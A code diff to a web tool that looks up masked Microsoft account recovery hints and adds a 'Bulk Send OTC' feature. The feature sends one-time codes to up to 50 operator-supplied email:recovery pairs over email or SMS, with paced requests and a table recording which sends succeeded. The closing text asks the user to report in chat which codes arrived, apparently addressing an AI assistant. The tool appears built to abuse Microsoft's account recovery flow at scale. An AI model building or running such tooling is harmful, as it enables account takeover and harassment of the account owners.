@@ -30,7 +30,10 @@
           Single Email
         </button>
         <button id="tab-bulk" class="flex-1 py-2.5 rounded-xl text-sm font-semibold text-slate-600 hover:bg-slate-50">
-          Bulk (up to 100)
+          Bulk Lookup
+        </button>
+        <button id="tab-otc" class="flex-1 py-2.5 rounded-xl text-sm font-semibold text-slate-600 hover:bg-slate-50">
+          Bulk Send OTC
         </button>
       </div>
 
@@ -80,6 +83,49 @@
         <div id="bulk-result" class="mt-4 space-y-3"></div>
       </section>
 
+      <!-- BULK SEND OTC -->
+      <section id="panel-otc" class="hidden">
+        <form id="otc-form" class="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 space-y-4">
+          <div>
+            <div class="flex items-center justify-between mb-2">
+              <label class="text-sm font-semibold text-slate-700">Email : Alternate pairs</label>
+              <span id="otc-count" class="text-xs text-slate-400">0 pairs detected</span>
+            </div>
+            <textarea id="otc-pairs" rows="10" spellcheck="false"
+              placeholder="email:alter&#10;eliannkoch60@outlook.com:eliannkoch60@devilott.space&#10;alice@hotmail.com:alice.recovery@example.com&#10;..."
+              class="w-full px-3 py-2.5 rounded-lg border border-slate-200 text-slate-900 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 resize-y"></textarea>
+            <p class="text-xs text-slate-400 mt-1.5">
+              One pair per line in <code class="bg-slate-100 px-1 py-0.5 rounded font-mono">email:alternate</code> format.
+              Up to 50. Lines that don't contain a colon are ignored.
+            </p>
+          </div>
+          <div class="flex items-end gap-3 flex-wrap">
+            <div class="flex-1 min-w-[140px]">
+              <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wide mb-1.5">
+                Channel
+              </label>
+              <select id="otc-channel"
+                class="w-full px-3 py-2 rounded-lg border border-slate-200 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <option value="Email">Email (alternate is recovery email)</option>
+                <option value="SMS">SMS (alternate is recovery phone)</option>
+              </select>
+            </div>
+            <div class="w-40">
+              <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wide mb-1.5">
+                Delay (ms)
+              </label>
+              <input id="otc-delay" type="number" min="0" max="10000" step="100" value="1500"
+                class="w-full px-3 py-2 rounded-lg border border-slate-200 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500" />
+            </div>
+            <button type="submit" id="otc-btn"
+              class="px-6 py-2.5 rounded-lg bg-violet-600 text-white font-semibold text-sm hover:bg-violet-700 disabled:opacity-50 whitespace-nowrap">
+              Send OTC to all
+            </button>
+          </div>
+        </form>
+        <div id="otc-result" class="mt-4 space-y-3"></div>
+      </section>
+
       <p class="text-center text-xs text-slate-400 mt-6">
         Calls happen server-side using one shared session. Microsoft only returns masked hints
         (e.g. <code class="bg-slate-100 px-1 py-0.5 rounded font-mono">u***@g***.com</code>).
@@ -90,23 +136,23 @@
       const $ = (s) => document.querySelector(s);
 
       // --- Tab switching ---
-      const tabSingle = $("#tab-single");
-      const tabBulk = $("#tab-bulk");
-      const panelSingle = $("#panel-single");
-      const panelBulk = $("#panel-bulk");
+      const tabs = {
+        single: { btn: $("#tab-single"), panel: $("#panel-single") },
+        bulk:   { btn: $("#tab-bulk"),   panel: $("#panel-bulk")   },
+        otc:    { btn: $("#tab-otc"),    panel: $("#panel-otc")    },
+      };
       function selectTab(which) {
-        const isSingle = which === "single";
-        panelSingle.classList.toggle("hidden", !isSingle);
-        panelBulk.classList.toggle("hidden", isSingle);
-        tabSingle.classList.toggle("bg-blue-600", isSingle);
-        tabSingle.classList.toggle("text-white", isSingle);
-        tabSingle.classList.toggle("text-slate-600", !isSingle);
-        tabBulk.classList.toggle("bg-blue-600", !isSingle);
-        tabBulk.classList.toggle("text-white", !isSingle);
-        tabBulk.classList.toggle("text-slate-600", isSingle);
+        for (const [name, { btn, panel }] of Object.entries(tabs)) {
+          const active = name === which;
+          panel.classList.toggle("hidden", !active);
+          btn.classList.toggle("bg-blue-600", active);
+          btn.classList.toggle("text-white", active);
+          btn.classList.toggle("text-slate-600", !active);
+        }
       }
-      tabSingle.addEventListener("click", () => selectTab("single"));
-      tabBulk.addEventListener("click", () => selectTab("bulk"));
+      for (const [name, { btn }] of Object.entries(tabs)) {
+        btn.addEventListener("click", () => selectTab(name));
+      }
 
       // --- Helpers ---
       const escapeHtml = (s) =>
@@ -502,6 +548,134 @@
           downloadCSV(buildRows(view), tag);
         }
       });
+
+      // --- Bulk Send OTC ---
+      const otcPairs = $("#otc-pairs");
+      const otcCount = $("#otc-count");
+
+      function parseOtcPairs() {
+        return otcPairs.value
+          .split(/\r?\n/)
+          .map((line) => line.trim())
+          .filter((line) => line.length > 0 && !/^email\s*:\s*alter/i.test(line))
+          .map((line) => {
+            const idx = line.indexOf(":");
+            if (idx === -1) return null;
+            const email = line.slice(0, idx).trim();
+            const alternate = line.slice(idx + 1).trim();
+            if (!email.includes("@") || !alternate) return null;
+            return { email, alternate };
+          })
+          .filter(Boolean);
+      }
+
+      otcPairs.addEventListener("input", () => {
+        const n = parseOtcPairs().length;
+        otcCount.textContent = `${n} pair${n === 1 ? "" : "s"} detected`;
+      });
+
+      $("#otc-form").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const pairs = parseOtcPairs();
+        if (!pairs.length) {
+          $("#otc-result").innerHTML = renderError("No valid email:alternate pairs found.");
+          return;
+        }
+        const channel = $("#otc-channel").value === "SMS" ? "SMS" : "Email";
+        const delayMs = Number($("#otc-delay").value) || 1500;
+        const btn = $("#otc-btn");
+        const out = $("#otc-result");
+        btn.disabled = true;
+        btn.textContent = "Sending…";
+        out.innerHTML = `
+          <div class="bg-white rounded-2xl border border-slate-200 p-5 text-sm text-slate-600 flex items-center gap-3">
+            <svg class="w-5 h-5 animate-spin text-violet-600" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
+            </svg>
+            <span>Sending OTC for ${pairs.length} pair${pairs.length === 1 ? "" : "s"} sequentially (${channel})…</span>
+          </div>`;
+        try {
+          const r = await fetch("/api/send-otc/bulk", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ pairs, channel, delayMs }),
+          });
+          const data = await r.json();
+          // Merge the unmasked alternate back from our local copy (the server
+          // intentionally doesn't echo it). Match by index, fall back to email.
+          if (data.success && Array.isArray(data.results)) {
+            data.results = data.results.map((row, i) => ({
+              ...row,
+              alternate: pairs[row.index ?? i]?.alternate ?? pairs[i]?.alternate ?? "",
+            }));
+          }
+          out.innerHTML = renderOtcBulk(data);
+        } catch (err) {
+          out.innerHTML = renderError(err.message);
+        } finally {
+          btn.disabled = false;
+          btn.textContent = "Send OTC to all";
+        }
+      });
+
+      function renderOtcBulk(d) {
+        if (!d.success) return renderError(d.error || "Bulk send failed");
+
+        const card = (label, val, color) => {
+          const cls = {
+            slate:   "bg-slate-50 border-slate-200 text-slate-900",
+            emerald: "bg-emerald-50 border-emerald-200 text-emerald-900",
+            red:     "bg-red-50 border-red-200 text-red-900",
+          }[color];
+          return `<div class="rounded-xl border p-4 ${cls}">
+            <div class="text-xs font-semibold uppercase tracking-wide opacity-70">${label}</div>
+            <div class="text-2xl font-bold mt-1">${val}</div>
+          </div>`;
+        };
+
+        const dash = `<span class="text-slate-300">—</span>`;
+        const rows = d.results.map((r) => {
+          const status = r.success
+            ? `<span class="inline-flex items-center text-xs font-semibold px-2 py-1 rounded bg-emerald-100 text-emerald-700">sent</span>`
+            : `<span class="inline-flex items-center text-xs font-semibold px-2 py-1 rounded bg-red-100 text-red-700">failed</span>`;
+          return `<tr class="hover:bg-slate-50">
+            <td class="px-4 py-3 font-mono text-xs text-slate-900 break-all">${escapeHtml(r.email)}</td>
+            <td class="px-4 py-3 font-mono text-xs text-slate-900 break-all">${escapeHtml(r.alternate)}</td>
+            <td class="px-4 py-3 font-mono text-xs text-slate-700">${r.proofDisplay ? escapeHtml(r.proofDisplay) : dash}</td>
+            <td class="px-4 py-3 text-xs text-slate-500">${escapeHtml(r.channel ?? "")}</td>
+            <td class="px-4 py-3">${status}</td>
+            <td class="px-4 py-3 text-xs text-slate-600">${r.success ? `state ${escapeHtml(r.state ?? "?")}` : escapeHtml(r.error ?? "unknown")}</td>
+          </tr>`;
+        }).join("");
+
+        return `
+          <div class="grid grid-cols-3 gap-3">
+            ${card("Total", d.summary.total, "slate")}
+            ${card("Sent",  d.summary.sent,  "emerald")}
+            ${card("Failed", d.summary.failed, "red")}
+          </div>
+          <div class="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden mt-3">
+            <div class="overflow-x-auto">
+              <table class="w-full text-sm">
+                <thead class="bg-slate-50 text-slate-500 text-xs uppercase tracking-wide">
+                  <tr>
+                    <th class="px-4 py-3 text-left font-semibold">Email</th>
+                    <th class="px-4 py-3 text-left font-semibold">Alternate</th>
+                    <th class="px-4 py-3 text-left font-semibold">Hint matched</th>
+                    <th class="px-4 py-3 text-left font-semibold">Channel</th>
+                    <th class="px-4 py-3 text-left font-semibold">Status</th>
+                    <th class="px-4 py-3 text-left font-semibold">Detail</th>
+                  </tr>
+                </thead>
+                <tbody class="divide-y divide-slate-100">${rows}</tbody>
+              </table>
+            </div>
+          </div>
+          <p class="text-center text-xs text-slate-400 mt-3">
+            Now check the recovery inbox/phone for each row. Tell me in chat which ones actually received the code.
+          </p>`;
+      }
     </script>
   </body>
 </html>
